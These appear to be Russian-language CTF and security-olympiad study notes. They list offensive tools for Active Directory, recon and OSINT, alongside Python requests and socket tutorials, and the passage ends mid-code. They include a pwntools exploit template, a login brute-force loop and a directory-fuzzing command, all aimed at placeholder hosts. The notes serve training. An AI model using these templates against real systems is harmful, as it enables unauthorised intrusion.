1. `GDB` - инструмент для отладки программ.
2. `Radare2` - платформа для анализа и декомпиляции программ.
3. `pwntools` - библиотека для автоматизации процесса взлома программ.
4. `AFL` - фреймворк для автоматического обнаружения уязвимостей.
5. `Angr` - фреймворк для анализа безопасности программ.
6. `QEMU` - эмулятор процессора.
7. `GDB-PEDA` - плагин для GDB.
8. `ROPgadget` - инструмент для поиска кодовых кусков.
9. `PeachPy` - библиотека на языке Python для работы с ассемблером.
10. `AFL` - фреймворк для автоматического обнаружения уязвимостей (**фаззинг**).



Active Directory
1. `impacket-GetNPUsers` - позволяет получить список пользователей в Active Directory.
2. `enum4linux-ng` - используется для сканирования системы и получения информации о ней.
3. `evil-winrm` - позволяет подключиться к системе по протоколу WinRM.
4. `ldapsearch` - используется для поиска информации в LDAP-каталоге.
5. `crackmapexec` - позволяет проверить уязвимости в системах.
6. `kerbrute` - используется для брутфорса и перебора учетных записей в Active Directory.
7. `smbclient` - позволяет подключиться к системе по протоколу SMB.
8. `bloodhound` - используется для анализа связей в Active Directory.
9. `adalanche` - аналогичен bloodhound и используется для анализа связей в Active Directory.

Linux
`|` - составление цепочки команд 
`>` - перенаправляет вывод из консоли
`>>` - если файл существует, не перезаписывает в него как >, а дописывает в конец
1. `cd [Путь к директории]`- перемещает в заданную директорию
2. `mkdir [Название директории]` - создает каталог
3. `ls` - показывает все видимые файлы в директории (-a - показывает невидимые файлы)
4. `touch [~/Путь/Название файла]` - создание файла 
5. `cat [Название файла]` - отображает содержимое файла в консоли
6. `less [Название файла]` - открывает расширенную программу просмотра файлов
7. `more [Название файла]` - то же самое, что и less, только с меньшими возможностями
8. `file [Название файла]` - показывает расширение файла
9. `mv /|Что переместить| /|Куда переместить|` - перемещает файл 
10. `rm [Название файла]` - удаляет файл ( -r для удаления каталога)
11. `find [Название файла]` - ищет заданный файл
12. `grep -[Опция] "Строка без учета регистра"  [Путь к файлу]` - рекурсивно ищет заданную строку в файлах
13. `unzip` - распаковывает zip архив в текущую директорию
14. `echo` - вывод в консоль
15. `wc [Путь к файлу]` - выводит количество строк, слов и символов в файле

Sites
https://dnsdumpster.com/ - изучение известной информации о домене и связанных с ним ресурсов
https://crt.sh/ - Сервис crt.sh — это база данных открытых SSL/TLS-сертификатов, которые были выданы для доменных имен
https://osintframework.com/ - всех популярных инструментов и ресурсов для OSINT
https://github.com/jivoi/awesome-osint - всех популярных статей, исследований, кейсов и инструментов в OSINT
https://habr.com/ru/companies/tensor/articles/706656/ - со стороны организации на целесообразность создания процесса киберразведки в собственной системе
shodan.io
censys.io
pentest-tools.com

Command
host URL - показывает ip сайта

dird URL путь к словарю - поиск скрытых страниц

nslookup -[опции] <имя хоста для опроса или IP-адрес> [сервер DNS]

nmap - сканер портов https://nmap.org/man/ru/
zenmap - GUI для nmap

masscan - сканер сети, разработанный с целью увеличения скорости сканирования крупных сегментов сети, в т.ч. всего пространства адресов IPv4 https://github.com/robertdavidgraham/masscan

amass -Глубокий инструмент перечисления субдоменов, написан на Go.(актив) https://github.com/EgeBalci/Amber

subfinder - Модульный инструмент обнаружения субдоменов, который может найти большое количество валидных субдоменов любой цели. https://github.com/projectdiscovery/subfinder

assetfinder - пассивный сканер поддоменов на Go https://github.com/tomnomnom/assetfinder

ffuf -w ~/Repositories/YAWR/Web/files_and_directories/fuzz.txt -u URL/FUZZ -fc 403 - поиск файлов 

ssh <port> <username>@<ip> - подключение к системе по ссш 

ffuf
Рассмотрим использование **утилиты ffuf,** используемой для обнаружения существующих путей до файлов и директорий на веб-сервере.

Для ведения перебора понадобится словарь путей, например:  
https://github.com/empty-jack/YAWR/blob/master/Web/files_and_directories/fuzz.txt

Укажем утилите следующие ключи:

- `-w` – путь до файла со словарем;
- `-u` – целевой URL, в который необходимо поместить слово FUZZ для указания места для вставки паттернов из словаря,
- `-fc` – фильтрация кодов HTTP-ответов.

`ffuf -w ~/Repositories/YAWR/Web/files_and_directories/fuzz.txt -u http://evil.corp:1337/FUZZ -fc 403`


nslookup
nslookup [опции] <имя хоста для опроса или IP-адрес> [сервер DNS]

Вход в интерактивный режим: nslookup

В интерактивном режиме опции задаются через set

Применяются для команды и интерактивного режима:

| Опция                   | Описание                                                                                                                                                                                                                                                                     |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| all                     | Выводит параметры текущего запроса и настроек сервера DNS.                                                                                                                                                                                                                   |
| class=X                 | Задает класс запроса, который указывает группу протоколов информации. Возможны варианты:  <br>1. IN — Internet. Более, чем в 99% случаев используется он.  <br>2. CHAOS, HESIOD — данные классы используются, крайне, редко.  <br>3. ANY — запрос по всем возможным классам. |
| d2                      | Выводит полной информации по осуществлению запроса.                                                                                                                                                                                                                          |
| nod2                    | Обычный вывод (по умолчанию).                                                                                                                                                                                                                                                |
| debug                   | Покажет отладочную информацию по запросу.                                                                                                                                                                                                                                    |
| nodebug                 | Запрос без отображения отладочной информации (по умолчанию).                                                                                                                                                                                                                 |
| defname                 | При запросе к хосту не FQDN автоматически подставит домен, который находится в настройках системы (DNS-суффикс).                                                                                                                                                             |
| nodefname               | Не подставлять домен.                                                                                                                                                                                                                                                        |
| domain='NAME'           | Задает домен, который должен быть подставлен к имени хоста (альтернатива DNS-суффиксу).                                                                                                                                                                                      |
| recurse                 | Рекурсивный запрос (информация запрашивается у других серверов, если ее нет на используемом в запросе).                                                                                                                                                                      |
| norecurse               | Запрет на использование рекурсивного запроса.                                                                                                                                                                                                                                |
| retry=X                 | В случае долгого ответа, параметр позволяет указать количество повторов опроса.                                                                                                                                                                                              |
| root                    | Назначает текущий DNS в качестве корневого сервера по умолчанию.                                                                                                                                                                                                             |
| root=NAME               | Позволяет задать корневой сервер.                                                                                                                                                                                                                                            |
| search                  | Добавлять DNS-имена к имени хоста из списка доменов (сам список задается опцией **srchlist**).                                                                                                                                                                               |
| nosearch                | Не использовать список доменов для подстановки к имени хоста.                                                                                                                                                                                                                |
| srchlist=N1[/N2/.../N6] | Задает список доменов, который нужно подставлять при использовании опции **search**.                                                                                                                                                                                         |
| timeout=X               | Задает время в секундах, сколько утилита должна ждать ответа от сервера.                                                                                                                                                                                                     |
| type=X                  | Указывает на тип записи, которую будем опрашивать. Например, для получения записи AAAA мы вводим опцию **type=АААА**.                                                                                                                                                        |
| vc                      | Позволяет использовать виртуальную схему при отправке запросов. К сожалению, я не нашел подробного описания, что это значит.                                                                                                                                                 |
| novc                    | Не использовать виртуальную схему при отправке запросов.                                                                                                                                                                                                                     |
| querytype=TYPE          | Указывает на тип запроса или тип записи, например, А, mx, txt и так далее. Аналогична опции type.                                                                                                                                                                            |
| q=ANY                   | Чтобы получить записи всех типов можно использовать тип запроса ANY                                                                                                                                                                                                          |
| q=AXFR                  | AXFR запрос, или Zone transfer — это процесс передачи копии базы данных с DNS-зоной от главного сервера к вторичному (зачастую требует указания конкретного DNS-сервера, к которому будет отправлен запрос).                                                                 |
Работают только в интерактивном режиме (задается без SET)

| Опция         | Описание                                                                                  |
| ------------- | ----------------------------------------------------------------------------------------- |
| lsserver NAME | Задает имя сервера DNS. При определении имени NAME используется начальная настройка DNS.  |
| server NAME   | Задает имя сервера DNS. При определении имени NAME используется текущее значение для DNS. |





Git Command
Создание нового репозитория в командной строкеecho "# Cyber-Security-learning" >> README.md 
 git init 
 git add README.md 
 git commit -m "первый коммит" 
 git branch -M main 
 git remote add origin https://github.com/Taram561/Cyber-Security-learning.git 
 git push -u origin main

 # Отправить существующий репозиторий из командной строки

git remote add origin https://github.com/Taram561/Cyber-Security-learning.git 
 git branch -M main 
 git push -u origin main





2. Структура курса от нуля до финалиста
Курс построен по принципу **«от простого к сложному»** и состоит из 11 взаимосвязанных модулей.

| Модуль                          | Уровень             | Ключевые темы                          | Связь с финалом                  |
| ------------------------------- | ------------------- | -------------------------------------- | -------------------------------- |
| **0. Стартовый**                | Нулевой             | Окружение, командная строка, редакторы | Базовые навыки работы            |
| **1. Программирование**         | Базовый             | Python, C, ассемблер                   | Автоматизация анализа            |
| **2. Веб-безопасность**         | Базовый-Средний     | OWASP Top 10, инструменты              | Взлом веб-приложений             |
| **3. Реверс-инжиниринг**        | Средний             | Статический/динамический анализ        | Анализ бинарных файлов           |
| **4. Криптография**             | Средний             | Классика и современные алгоритмы       | Взлом криптосистем               |
| **5. Расследование инцидентов** | Средний-Продвинутый | Анализ трафика, дисков, памяти         | Ключевой этап финала             |
| **6. Анализ вредоносного ПО**   | Продвинутый         | Статика и динамика, песочницы          | Определение источника атаки      |
| **7. Стеганография**            | Средний             | LSB, метаданные, структуры файлов      | Поиск скрытой информации         |
| **8. Сетевая разведка**         | Средний             | Сканирование, картографирование, OSINT | Составление карты инфраструктуры |
| **9. Нейросети как инструмент** | Базовый             | Prompt-инжиниринг для анализа          | Ускорение рутинных задач         |
| **10. Комплексная задача**      | Продвинутый         | Полный цикл от легенды до отчета       | Имитация реального финала        |



3. Модуль 0 Стартовая подготовка
**Цель**: Создать готовую рабочую среду

### **Теоретический материал:**

- **Kali Linux**: специализированный дистрибутив для тестирования безопасности
- **Командная строка (Bash)**: `cd`, `ls`, `cat`, `grep`, `find`, конвейеры (`|`)
- **Виртуальная машина**: изолированная среда для экспериментов (VirtualBox/VMware)
- **Редакторы кода**: VS Code с плагинами для Python, C, ассемблера

### **Практические задания:**

1. Установите Kali Linux на виртуальную машину
2. Освойте базовые команды: создайте папку `~/nto-training`, в ней файл `notes.txt`
3. Настройте SSH-доступ к своей виртуальной машине

### **Типичные ошибки:**

- Работа от имени root без необходимости
- Отсутствие системы резервного копирования рабочей среды

### **Пример олимпиадного мышления:**

_На финале вам дадут виртуальную машину с минимальной настройкой. Умение быстро адаптировать среду под себя — первый навык, который проверяется._


4. Модуль 1 Программирование — главный инструмент
**Цель**: Научиться автоматизировать анализ и писать скрипты для взаимодействия с сетевыми сервисами

### **Теоретический материал:**

**Python**:

```python
# Ключевые библиотеки для ИБ
import requests    # HTTP-запросы
import socket      # сетевое программирование
import struct      # работа с бинарными данными
import re          # регулярные выражения
from pwn import *  # библиотека для CTF (pwntools)
```

**Основы C для реверса**:

```c
// Понимание указателей и памяти
int main() {
    char buffer[10];           // буфер в стеке
    strcpy(buffer, "AAAAAAA"); // потенциальное переполнение
    return 0;
}
```

**Ассемблер (x86/x64 основы)**:

- **Регистры**: EAX/RAX (аккумулятор), ESP/RSP (указатель стека), EIP/RIP (указатель инструкций)
- **Основные инструкции**: `mov` (перемещение), `add`/`sub` (сложение/вычитание), `cmp` (сравнение), `jmp`/`je`/`jne` (переходы), `call`/`ret` (вызов/возврат из функции)
- **Стек**: организация LIFO (Last In, First Out), инструкции `push`/`pop`

### **Детализация:**

**Работа с бинарными данными (ключ для реверса и крипто):**

```python
import struct
# Pack и unpack - критически важны!
# Упаковка 32-битного числа в little-endian
packed = struct.pack('<I', 0xdeadbeef)  # b'\xef\xbe\xad\xde'
# Распаковка
unpacked = struct.unpack('<I', packed)[0]  # 3735928559
```

**Сетевое программирование — не только socket:**

```python
import telnetlib, subprocess
# Работа с интерактивными сервисами
tn = telnetlib.Telnet(host, port)
tn.read_until(b"Login: ")
tn.write(b"admin\n")
# Запуск внешних инструментов
output = subprocess.check_output(['nmap', '-sV', host], text=True)
```

**Библиотека `pwntools` — стандарт CTF:**
```python
from pwn import *
# Автоматизация взлома бинарных файлов
conn = remote('ctf.example.com', 31337)
# Получаем утечку адреса из программы
leak = conn.recvline().decode()
# Вычисляем адрес (обход ASLR)
libc_base = int(leak, 16) - 0x12345
# Создаём эксплойт
payload = b'A'*64 + p64(libc_base + 0xabcde)  # p64() упаковывает число
conn.send(payload)
conn.interactive()
```

### **Разбор решения задачи:**

**Задача**: Напишите скрипт, который соединяется с TCP-сервером, отправляет строку и читает ответ.

**Решение**:

```python
import socket

def communicate_with_server(host, port, message):
    # Создаем сокет
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Отправляем сообщение
    s.sendall(message.encode())
    
    # Читаем ответ (максимум 1024 байта)
    data = s.recv(1024)
    
    # Закрываем соединение
    s.close()
    
    return data.decode()

# Использование
response = communicate_with_server("ctf.example.com", 31337, "Hello!")
print(f"Ответ сервера: {response}")
```

**Разбор**: Эта функция — основа для взаимодействия с сетевыми сервисами в CTF. В реальных задачах нужно будет:

1. Анализировать протокол (что отправляет сервер, что ожидает)
2. Реализовывать логику обмена (возможно, несколько циклов отправки-получения)
3. Обрабатывать исключения (разрыв соединения, таймауты)

### Практические задания:
1. Напишите TCP-клиент для эхо-сервера
2. Парсите HTML-страницу, извлекайте все ссылки с помощью `requests` и `BeautifulSoup`
3. Реализуйте функцию для перебора паролей по словарю
### **Практические задания (усложнённые):**

1. **TCP-прокси для анализа**: Напишите прокси на Python, который принимает соединение, пересылает все данные на целевой сервер, логирует их в hexdump и позволяет модифицировать определённые байты в потоке.
2. **Анализатор PCAP на pure Python**: Используя `struct` и знания о формате заголовков Ethernet/IP/TCP, напишите скрипт, который открывает `.pcap` файл (без Wireshark!) и выводит список уникальных IP-адресов в нём.
3. **Эксплойт для простого переполнения буфера**: Дана уязвимая программа и исходник на C. Используя `pwntools`, создайте рабочий эксплойт, который запускает `/bin/sh`.

Мы рассмотрим каждую из указанных библиотек Python, которые являются ключевыми для задач в области информационной безопасности, особенно в CTF и олимпиадах.

1. **requests** - для работы с HTTP-запросами.
2. **socket** - для низкоуровневого сетевого взаимодействия.
3. **struct** - для преобразования между байтами и типами данных Python.
4. **re** - для работы с регулярными выражениями.
5. **pwn** (или **pwntools**) - это библиотека для эксплойтостроения и взаимодействия с сетевыми службами.

Обрати внимание, что библиотека `pwn` не является стандартной, и ее нужно устанавливать отдельно. Обычно она устанавливается как `pwntools`.

Давайте подробно разберем каждую библиотеку.

---

## 1. Библиотека `requests`
Библиотека `requests` — основной инструмент для работы с HTTP-протоколами в Python. В отличие от низкоуровневого `socket`, она предоставляет удобный высокоуровневый API. Это основа для решения веб-задач (SQLi, авторизация, парсинг) в CTF и олимпиадах.

Ниже представлено подробное руководство, которое поможет вам освоить эту библиотеку от установки до продвинутых техник.

### 📦 Установка и базовое использование
Перед началом работы установите библиотеку в терминале, используя менеджер пакетов `pip`:
```bash
pip install requests
```
Затем импортируйте её в скрипт:
```python
import requests
```

### 📡 Основные HTTP-методы и их применение
Основные действия в `requests` выполняются с помощью функций, названия которых соответствуют HTTP-методам. Для всех них есть общая структура: `requests.метод(url, параметры...)`.

#### 1. GET-запросы (Получение данных)
Метод `GET` используется для запроса данных с сервера.
```python
response = requests.get('https://api.github.com/events')
```
- **Параметры запроса (`params`)**: Для передачи данных в строку URL (после `?`) используйте словарь. Библиотека корректно закодирует их.
```python
    params = {'key1': 'value1', 'key2': 'value2'}
    response = requests.get('https://httpbin.org/get', params=params)
    print(response.url) # https://httpbin.org/get?key1=value1&key2=value2
    ```

#### 2. POST-запросы (Отправка данных)
Метод `POST` отправляет данные на сервер, например, для авторизации или отправки формы. Данные можно передавать в двух форматах:
- **Данные формы (`data`)**: Имитация отправки HTML-формы.
```python
    payload = {'username': 'admin', 'password': 'secret'}
    response = requests.post('https://httpbin.org/post', data=payload)
    ```
- **JSON (`json`)**: Отправка структурированных данных.
```python
    json_data = {'title': 'My Post', 'body': 'Hello world'}
    response = requests.post('https://httpbin.org/post', json=json_data)
    ```

#### 3. Другие методы
Для полного контроля над API также используются `PUT` (полное обновление ресурса), `DELETE` (удаление), `HEAD` (получение только заголовков).

### 🔍 Анализ ответа сервера
Результат любого запроса — объект `Response`. Его основные атрибуты:

| Атрибут / Метод                   | Описание                                                                                                                       | Пример (в CTF-контексте)                                             |
| :-------------------------------- | :----------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------- |
| **`response.status_code`**        | Числовой код состояния HTTP. `200` — успех, `404` — не найдено, `403` — доступ запрещён, `500` — ошибка сервера.               | `if response.status_code == 200: print('Уязвимость найдена!')`       |
| **`response.text`**               | Тело ответа в виде строки. Для HTML/текстовых страниц.                                                                         | `if 'flag{' in response.text: print('Найден флаг!')`                 |
| **`response.content`**            | Тело ответа в виде байтов. Для скачивания файлов, картинок.                                                                    | `with open('image.png', 'wb') as f: f.write(response.content)`       |
| **`response.json()`**             | Парсит ответ, если он в формате JSON, и возвращает словарь/список.                                                             | `data = response.json(); flag = data['challenge']['flag']`           |
| **`response.headers`**            | Заголовки ответа в виде словаря.                                                                                               | `token = response.headers.get('X-CSRF-Token')`                       |
| **`response.url`**                | Итоговый URL запроса (полезно при редиректах).                                                                                 | `print(f'Финальный URL после редиректа: {response.url}')`            |
| **`response.raise_for_status()`** | **Важно!** Автоматически вызывает исключение, если код ответа указывает на ошибку (4xx или 5xx). Позволяет не пропустить сбой. | `try: response.raise_for_status() except: print('Запрос неудачный')` |

### ⚙️ Расширенные настройки запросов
Для решения сложных олимпиадных задач нужен более тонкий контроль.

#### 1. Заголовки (`headers`)
Через заголовки передаётся служебная информация. В CTF это может быть ключ API, токен или пользовательский агент.
```python
headers = {
    'User-Agent': 'Mozilla/5.0 (CTF Bot)',
    'Authorization': 'Bearer secret_token',
    'X-Custom-Flag': 'try_harder'
}
response = requests.get('https://target.com/admin', headers=headers)
```

#### 2. Авторизация (`auth`)
Для базовой HTTP-аутентификации (логин/пароль).
```python
response = requests.get('https://target.com/protected', auth=('admin', 'password123'))
```

#### 3. Куки (`cookies`)
Для работы с сессиями, когда сервер использует cookies для отслеживания состояния (например, после логина).
```python
# Отправка cookies с запросом
cookies = {'session_id': 'abc123'}
response = requests.get('https://target.com/dashboard', cookies=cookies)

# Получение cookies из ответа
received_cookies = response.cookies
```

#### 4. Сессии (`Session`)
Класс `Session` сохраняет параметры (куки, заголовки) между запросами, что ускоряет работу и имитирует поведение браузера. Критически важен для задач, где нужно пройти несколько шагов авторизации.
```python
with requests.Session() as s:
    s.auth = ('user', 'pass') # Авторизация для всех запросов сессии
    s.headers.update({'User-Agent': 'CTF-Scanner'})

    # Первый запрос устанавливает сессионную куку
    s.post('https://target.com/login', data={'login': 'admin'})

    # Второй запрос автоматически использует ту же сессию
    resp = s.get('https://target.com/profile')
    print(resp.text) # Видим данные профиля
```

#### 5. Таймауты и обработка ошибок
Сетевые задачи часто зависают, поэтому важно устанавливать таймауты.
```python
try:
    # Таймаут в 5 секунд на установление соединения и 10 секунд на чтение данных
    response = requests.get('http://slow.ctf.task', timeout=(5, 10))
    response.raise_for_status() # Проверка на HTTP-ошибку
except requests.exceptions.Timeout:
    print("Сервер не ответил вовремя.")
except requests.exceptions.RequestException as e:
    print(f"Критическая ошибка сети: {e}")
```

### 💡 Типовые шаблоны для CTF
Для быстрого старта используйте эти шаблоны.

#### Шаблон 1: Перебор параметров (Brute Force)
```python
import requests

url = 'http://vuln-site.com/login'
wordlist = ['admin', 'root', 'test']

for user in wordlist:
    for password in wordlist:
        resp = requests.post(url, data={'username': user, 'password': password})
        if 'Invalid credentials' not in resp.text:
            print(f'Успех! {user}:{password}')
            print(resp.text) # Ищем флаг в ответе
            break
```

#### Шаблон 2: Автоматизация многошаговой атаки с сессией
```python
import requests

s = requests.Session()
base_url = 'http://target.ctf'

# 1. Получаем CSRF-токен
resp = s.get(base_url + '/login')
# Ищем токен в HTML (здесь пригодится библиотека re)
csrf_token = resp.text.split('name="csrf" value="')[1].split('"')[0]

# 2. Логинимся
login_data = {'csrf': csrf_token, 'user': 'admin', 'pass': 'admin'}
s.post(base_url + '/login', data=login_data)

# 3. Переходим на страницу с флагом
flag_page = s.get(base_url + '/admin/flag')
print(flag_page.text)
```

**Основные моменты для запоминания:**
1.  **Всегда проверяйте статус ответа:** Используйте `response.raise_for_status()` или проверяйте `response.status_code`.
2.  **Используйте сессии (`Session`)** для задач, связанных с аутентификацией и куками.
3.  **Устанавливайте таймауты** для сетевых запросов, чтобы скрипт не "зависал".
4.  **Для скачивания файлов** используйте `response.content` и сохраняйте в режиме `'wb'` (запись байтов).

Для решения задач вам часто потребуется комбинировать `requests` с другими библиотеками: `re` — для парсинга HTML, `struct` — для работы с бинарными данными, `json` — для сложных API. Освоение `requests` — это 80% успеха в веб-задачах на олимпиадах.

Если вы хотите глубже разобрать конкретный тип атаки (например, SQL-инъекции через `requests`) или у вас есть задача, которую не получается решить, опишите её — разберём вместе.



# Исчерпывающее руководство по библиотеке `socket` в Python

Библиотека `socket` — это низкоуровневый Python-интерфейс к сетевому API операционной системы. В олимпиадной ИБ она **абсолютно незаменима** для прямого взаимодействия с сетевыми сервисами.

## 1. Фундаментальные концепции

### Что такое сокет?
Сокет — это конечная точка для сетевого обмена данными, сочетающая:
- **IP-адрес** (куда?)
- **Порт** (какое приложение?)
- **Протокол** (как общаться?)

### Типы сокетов:
1. **`SOCK_STREAM`** (TCP) — надёжный, с установкой соединения
   - Гарантированная доставка, порядок пакетов
   - Как телефонный звонок
2. **`SOCK_DGRAM`** (UDP) — ненадёжный, без соединения
   - Быстрый, без гарантий
   - Как почтовая открытка

## 2. Детальный разбор всех методов

### Создание сокета
```python
import socket

# TCP-сокет IPv4
tcp_socket = socket.socket(
    family=socket.AF_INET,      # IPv4
    type=socket.SOCK_STREAM,    # TCP
    proto=0,                    # Протокол по умолчанию
    fileno=None                 # Дескриптор файла (опционально)
)

# UDP-сокет IPv6
udp_socket = socket.socket(
    family=socket.AF_INET6,     # IPv6
    type=socket.SOCK_DGRAM,     # UDP
)
```

### Методы клиента

#### `connect(address)`
Устанавливает соединение с сервером.
```python
# Подробная реализация с обработкой ошибок
def connect_to_server(host, port, timeout=5):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Устанавливаем таймаут на операции
    sock.settimeout(timeout)
    
    try:
        # address должен быть кортеж (host, port)
        sock.connect((host, port))
        print(f"Успешное подключение к {host}:{port}")
        return sock
    except socket.timeout:
        print(f"Таймаут подключения к {host}:{port}")
        sock.close()
        return None
    except socket.error as e:
        print(f"Ошибка подключения: {e}")
        sock.close()
        return None
    except TypeError as e:
        print(f"Неверный формат адреса: {e}")
        sock.close()
        return None

# Использование
sock = connect_to_server("example.com", 80)
```

#### `send(data)`
Отправляет данные. **Важно:** может отправить не все данные!
```python
def send_all(sock, data):
    """Гарантированная отправка всех данных (аналог sendall)"""
    total_sent = 0
    while total_sent < len(data):
        try:
            # send возвращает количество отправленных байт
            sent = sock.send(data[total_sent:])
            if sent == 0:
                raise RuntimeError("Соединение разорвано")
            total_sent += sent
            print(f"Отправлено {sent} байт, всего {total_sent}/{len(data)}")
        except socket.error as e:
            print(f"Ошибка отправки: {e}")
            break
    return total_sent

# Пример
data = b"A" * 10000  # 10 КБ данных
send_all(sock, data)
```

#### `recv(bufsize)`
Получает данные. **Ключевые моменты:**
- `bufsize` — максимальный размер, но может вернуть меньше
- Возвращает `b''` при закрытии соединения
- Блокируется, пока не получит данные

```python
def receive_with_timeout(sock, timeout=5, chunk_size=4096):
    """Приём данных с таймаутом и сбором по частям"""
    sock.settimeout(timeout)
    total_data = []
    
    try:
        while True:
            chunk = sock.recv(chunk_size)
            if not chunk:  # Пустой байт = соединение закрыто
                break
            total_data.append(chunk)
            print(f"Получено {len(chunk)} байт")
            
            # Проверяем, не получены ли все ожидаемые данные
            # Например, по маркеру конца сообщения
            if b"\n" in chunk:
                break
                
    except socket.timeout:
        print("Таймаут приёма данных")
    except socket.error as e:
        print(f"Ошибка приёма: {e}")
    
    return b"".join(total_data)
```

### Методы сервера

#### `bind(address)`
Привязывает сокет к адресу.
```python
def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Важная опция: разрешить повторное использование адреса
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Привязка
    try:
        server_socket.bind((host, port))
        print(f"Сервер привязан к {host}:{port}")
    except socket.error as e:
        print(f"Ошибка привязки: {e}")
        return None
    
    return server_socket
```

#### `listen(backlog)`
Начинает прослушивание подключений.
```python
def start_listening(sock, backlog=5):
    """
    backlog - максимальная очередь ожидающих подключений
    Типичные значения: 5-10 для тестов, 128 для продакшн
    """
    sock.listen(backlog)
    print(f"Слушаем порт {sock.getsockname()[1]}, backlog={backlog}")
```

#### `accept()`
Принимает входящее подключение.
```python
def handle_client_connection(server_socket, timeout=None):
    """Принимает подключение и возвращает клиентский сокет"""
    server_socket.settimeout(timeout)  # None = блокирующий режим
    
    try:
        # accept() возвращает (новый_сокет, адрес_клиента)
        client_socket, client_address = server_socket.accept()
        print(f"Подключение от {client_address[0]}:{client_address[1]}")
        
        # Устанавливаем таймаут для операций с клиентом
        client_socket.settimeout(10)
        
        return client_socket, client_address
        
    except socket.timeout:
        print("Таймаут ожидания подключения")
        return None, None
    except socket.error as e:
        print(f"Ошибка accept: {e}")
        return None, None
```

## 3. Полный пример TCP-сервера для CTF

```python
import socket
import threading

class CTFServer:
    """TCP-сервер для олимпиадных задач"""
    
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        
    def start(self):
        """Запуск сервера"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            print(f"[*] CTF сервер запущен на {self.host}:{self.port}")
            
            self._accept_connections()
            
        except Exception as e:
            print(f"[!] Ошибка: {e}")
        finally:
            self.stop()
    
    def _accept_connections(self):
        """Приём подключений в отдельных потоках"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                print(f"[+] Новое подключение: {addr}")
                
                # Запускаем обработчик в отдельном потоке
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except socket.error:
                break
    
    def _handle_client(self, client_socket, addr):
        """Обработка клиента (типичная CTF-логика)"""
        try:
            # 1. Отправляем приветствие
            welcome = b"Welcome to CTF challenge!\n"
            welcome += b"Solve this: 2 + 2 = ?\n"
            client_socket.send(welcome)
            
            # 2. Получаем ответ
            answer = client_socket.recv(1024).strip()
            
            # 3. Проверяем ответ
            if answer == b"4":
                flag = b"CTF{correct_answer_flag}\n"
                client_socket.send(b"Correct! Flag: " + flag)
            else:
                client_socket.send(b"Wrong answer!\n")
                
        except socket.timeout:
            print(f"[-] Таймаут для {addr}")
        except socket.error as e:
            print(f"[-] Ошибка с клиентом {addr}: {e}")
        finally:
            client_socket.close()
            print(f"[-] Закрыто соединение с {addr}")
    
    def stop(self):
        """Остановка сервера"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("[*] Сервер остановлен")

# Запуск сервера
if __name__ == "__main__":
    server = CTFServer(port=31337)
    server.start()
```

## 4. Продвинутые техники для CTF

### Работа с бинарными данными
```python
import socket
import struct

def send_binary_challenge(host, port):
    """Сервис, отправляющий бинарные данные для анализа"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Получаем бинарную структуру
    data = sock.recv(1024)
    
    if len(data) >= 12:
        # Распаковываем: int, float, int (little-endian)
        a, b, c = struct.unpack('<IfI', data[:12])
        print(f"Получено: int={a}, float={b}, int={c}")
        
        # Вычисляем ответ
        result = a + int(b) + c
        
        # Отправляем обратно
        sock.send(struct.pack('<I', result))
        
        # Получаем флаг
        flag = sock.recv(1024)
        return flag
    
    sock.close()
    return None
```

### UDP-клиент для DNS/трассировки
```python
import socket

def udp_traceroute(destination, port=33434, max_hops=30):
    """Упрощённая трассировка маршрута (как traceroute)"""
    ttl = 1
    while ttl <= max_hops:
        # Создаём сокеты
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        # Устанавливаем TTL
        send_sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
        
        # Устанавливаем таймаут
        recv_sock.settimeout(3)
        
        # Отправляем пакет
        send_sock.sendto(b'', (destination, port))
        
        try:
            # Пытаемся получить ICMP ответ
            data, addr = recv_sock.recvfrom(1024)
            print(f"{ttl}: {addr[0]}")
            
            if addr[0] == destination:
                print("Достигнута цель!")
                break
                
        except socket.timeout:
            print(f"{ttl}: * * *")
        
        ttl += 1
        send_sock.close()
        recv_sock.close()
```

### Неблокирующие сокеты
```python
import socket
import select

def non_blocking_client(host, port):
    """Клиент с неблокирующими операциями"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Переводим в неблокирующий режим
    sock.setblocking(False)
    
    try:
        sock.connect((host, port))
    except BlockingIOError:
        # Ожидаем, пока соединение установится
        pass
    
    # Используем select для мониторинга сокета
    while True:
        ready_to_read, ready_to_write, in_error = select.select(
            [], [sock], [], 5  # 5 секунд таймаут
        )
        
        if ready_to_write:
            # Соединение установлено, можно отправлять
            sock.send(b"Hello from non-blocking client!\n")
            break
    
    # Приём данных тоже с select
    while True:
        ready_to_read, _, _ = select.select([sock], [], [], 5)
        if ready_to_read:
            data = sock.recv(1024)
            if data:
                print(f"Получено: {data}")
            else:
                break
    
    sock.close()
```

## 5. Типичные CTF-шаблоны

### Шаблон 1: Взаимодействие с сервисом
```python
def solve_ctf_service(host, port):
    """Универсальный шаблон для решения сетевых задач"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        s.connect((host, port))
        
        # 1. Читаем приветствие/условие
        data = s.recv(4096).decode()
        print(f"Условие: {data}")
        
        # 2. Извлекаем данные (например, числа для вычислений)
        import re
        numbers = re.findall(r'\d+', data)
        
        # 3. Вычисляем ответ
        if numbers:
